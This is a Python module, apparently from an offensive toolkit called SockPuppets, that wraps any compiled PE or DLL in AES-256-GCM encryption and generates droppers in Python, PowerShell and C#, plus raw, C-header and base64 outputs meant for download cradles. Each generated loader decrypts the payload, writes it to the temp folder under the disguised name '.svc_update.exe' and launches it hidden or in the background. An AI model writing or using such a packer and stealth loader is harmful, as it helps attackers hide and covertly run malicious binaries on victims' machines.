"""Universal PE/DLL to shellcode converter.

Wraps any compiled binary (Go, Rust, C, C#) into AES-256-GCM encrypted
shellcode in multiple output formats for BYO-loader scenarios.

Output formats:
  - raw (.bin)     — AES-256-GCM encrypted PE with nonce header
  - c (.h)         — C unsigned char array with AES decryptor
  - python (.py)   — Python loader with AES-GCM decryption
  - powershell (.ps1) — PowerShell loader with AES-GCM decryption
  - csharp (.cs)   — C# loader with AesGcm decryption
  - base64 (.b64)  — Base64-encoded for download cradles
"""

import os
import base64
import struct
import hashlib

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def _aes_encrypt(data: bytes, key: bytes) -> tuple:
    """AES-256-GCM encrypt. Returns (nonce, ciphertext+tag)."""
    aes_key = hashlib.sha256(key).digest()
    nonce = os.urandom(12)
    ct = AESGCM(aes_key).encrypt(nonce, data, None)
    return nonce, ct


def pe_to_shellcode(pe_path: str, output_dir: str, name_prefix: str = 'shellcode',
                     encryption_key: bytes = None, formats: list = None) -> dict:
    """Convert a PE/DLL file to AES-256-GCM encrypted shellcode in multiple formats.

    Args:
        pe_path: Path to the compiled PE or DLL
        output_dir: Directory to write output files
        name_prefix: Prefix for output filenames
        encryption_key: AES key material (random 32 bytes if None)
        formats: List of output formats (default: all)

    Returns:
        Dict of format -> output file path
    """
    if formats is None:
        formats = ['raw', 'c', 'python', 'powershell', 'csharp', 'base64']

    with open(pe_path, 'rb') as f:
        pe_data = f.read()

    if encryption_key is None:
        encryption_key = os.urandom(32)

    # AES-256-GCM encrypt the PE
    nonce, encrypted = _aes_encrypt(pe_data, encryption_key)
    aes_key_hex = hashlib.sha256(encryption_key).hexdigest()

    results = {}
    os.makedirs(output_dir, exist_ok=True)

    for fmt in formats:
        if fmt == 'raw':
            results['raw'] = _write_raw(output_dir, name_prefix, encryption_key, nonce, pe_data, encrypted)
        elif fmt == 'c':
            results['c'] = _write_c(output_dir, name_prefix, encryption_key, nonce, pe_data, encrypted)
        elif fmt == 'python':
            results['python'] = _write_python(output_dir, name_prefix, encryption_key, nonce, encrypted)
        elif fmt == 'powershell':
            results['powershell'] = _write_powershell(output_dir, name_prefix, encryption_key, nonce, encrypted)
        elif fmt == 'csharp':
            results['csharp'] = _write_csharp(output_dir, name_prefix, encryption_key, nonce, encrypted)
        elif fmt == 'base64':
            results['base64'] = _write_base64(output_dir, name_prefix, encryption_key, nonce, encrypted)

    return results


def _write_raw(output_dir, prefix, key, nonce, pe_data, encrypted):
    path = os.path.join(output_dir, f'{prefix}.bin')
    aes_key = hashlib.sha256(key).digest()
    with open(path, 'wb') as f:
        f.write(b'SP03')  # Magic (v3 = AES-GCM)
        f.write(aes_key)  # 32-byte AES key
        f.write(nonce)  # 12-byte nonce
        f.write(struct.pack('<I', len(pe_data)))  # Original PE length
        f.write(encrypted)  # AES-GCM ciphertext + 16-byte tag
    return path


def _write_c(output_dir, prefix, key, nonce, pe_data, encrypted):
    path = os.path.join(output_dir, f'{prefix}.h')
    aes_key = hashlib.sha256(key).digest()
    key_hex = ', '.join(f'0x{b:02x}' for b in aes_key)
    nonce_hex = ', '.join(f'0x{b:02x}' for b in nonce)
    with open(path, 'w') as f:
        f.write(f'// SockPuppets shellcode — AES-256-GCM encrypted PE\n')
        f.write(f'// Decrypt with AES-256-GCM using key + nonce, last 16 bytes are auth tag\n\n')
        f.write(f'unsigned char aes_key[32] = {{ {key_hex} }};\n')
        f.write(f'unsigned char nonce[12] = {{ {nonce_hex} }};\n')
        f.write(f'unsigned int pe_length = {len(pe_data)};\n')
        f.write(f'unsigned int ct_length = {len(encrypted)};\n')
        f.write(f'unsigned char ciphertext[] = {{\n')
        for i in range(0, len(encrypted), 16):
            chunk = encrypted[i:i+16]
            hex_line = ', '.join(f'0x{b:02x}' for b in chunk)
            f.write(f'    {hex_line},\n')
        f.write(f'}};\n')
    return path


def _write_python(output_dir, prefix, key, nonce, encrypted):
    path = os.path.join(output_dir, f'{prefix}_loader.py')
    aes_key = hashlib.sha256(key).digest()
    b64_key = base64.b64encode(aes_key).decode()
    b64_nonce = base64.b64encode(nonce).decode()
    b64_enc = base64.b64encode(encrypted).decode()
    with open(path, 'w') as f:
        f.write('import base64, os, sys, tempfile, hashlib\n')
        f.write('from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\n')
        f.write(f'k = base64.b64decode("{b64_key}")\n')
        f.write(f'n = base64.b64decode("{b64_nonce}")\n')
        f.write(f'e = base64.b64decode("{b64_enc}")\n')
        f.write(f'p = AESGCM(k).decrypt(n, e, None)\n')
        f.write(f't = os.path.join(tempfile.gettempdir(), ".svc_update" + (".exe" if sys.platform == "win32" else ""))\n')
        f.write(f'with open(t, "wb") as f: f.write(p)\n')
        f.write(f'os.chmod(t, 0o755) if os.name != "nt" else None\n')
        f.write(f'os.system(t + " &" if os.name != "nt" else f"start /b {{t}}")\n')
    return path


def _write_powershell(output_dir, prefix, key, nonce, encrypted):
    path = os.path.join(output_dir, f'{prefix}_loader.ps1')
    aes_key = hashlib.sha256(key).digest()
    b64_key = base64.b64encode(aes_key).decode()
    b64_nonce = base64.b64encode(nonce).decode()
    # Split ciphertext and tag (last 16 bytes)
    ct = encrypted[:-16]
    tag = encrypted[-16:]
    b64_ct = base64.b64encode(ct).decode()
    b64_tag = base64.b64encode(tag).decode()
    with open(path, 'w') as f:
        f.write(f'$key = [Convert]::FromBase64String("{b64_key}")\n')
        f.write(f'$nonce = [Convert]::FromBase64String("{b64_nonce}")\n')
        f.write(f'$ct = [Convert]::FromBase64String("{b64_ct}")\n')
        f.write(f'$tag = [Convert]::FromBase64String("{b64_tag}")\n')
        f.write(f'$aes = [System.Security.Cryptography.AesGcm]::new($key, 16)\n')
        f.write(f'$pt = New-Object byte[] $ct.Length\n')
        f.write(f'$aes.Decrypt($nonce, $ct, $tag, $pt)\n')
        f.write(f'$t = "$env:TEMP\\.svc_update.exe"\n')
        f.write(f'[IO.File]::WriteAllBytes($t, $pt)\n')
        f.write(f'Start-Process -WindowStyle Hidden $t\n')
    return path


def _write_csharp(output_dir, prefix, key, nonce, encrypted):
    path = os.path.join(output_dir, f'{prefix}_loader.cs')
    aes_key = hashlib.sha256(key).digest()
    b64_key = base64.b64encode(aes_key).decode()
    b64_nonce = base64.b64encode(nonce).decode()
    ct = encrypted[:-16]
    tag = encrypted[-16:]
    b64_ct = base64.b64encode(ct).decode()
    b64_tag = base64.b64encode(tag).decode()
    with open(path, 'w') as f:
        f.write('using System;\nusing System.IO;\nusing System.Diagnostics;\n')
        f.write('using System.Security.Cryptography;\n\n')
        f.write('class Loader {\n')
        f.write('    static void Main() {\n')
        f.write(f'        byte[] key = Convert.FromBase64String("{b64_key}");\n')
        f.write(f'        byte[] nonce = Convert.FromBase64String("{b64_nonce}");\n')
        f.write(f'        byte[] ct = Convert.FromBase64String("{b64_ct}");\n')
        f.write(f'        byte[] tag = Convert.FromBase64String("{b64_tag}");\n')
        f.write(f'        byte[] pt = new byte[ct.Length];\n')
        f.write(f'        using var aes = new AesGcm(key, 16);\n')
        f.write(f'        aes.Decrypt(nonce, ct, tag, pt);\n')
        f.write(f'        string tmp = Path.Combine(Path.GetTempPath(), ".svc_update.exe");\n')
        f.write(f'        File.WriteAllBytes(tmp, pt);\n')
        f.write(f'        Process.Start(new ProcessStartInfo(tmp) {{ WindowStyle = ProcessWindowStyle.Hidden }});\n')
        f.write('    }\n}\n')
    return path


def _write_base64(output_dir, prefix, key, nonce, encrypted):
    path = os.path.join(output_dir, f'{prefix}.b64')
    aes_key = hashlib.sha256(key).digest()
    with open(path, 'w') as f:
        f.write(f'# AES-256-GCM encrypted PE (key | nonce | ciphertext+tag)\n')
        f.write(base64.b64encode(aes_key).decode() + '\n')
        f.write(base64.b64encode(nonce).decode() + '\n')
        f.write(base64.b64encode(encrypted).decode() + '\n')
    return path
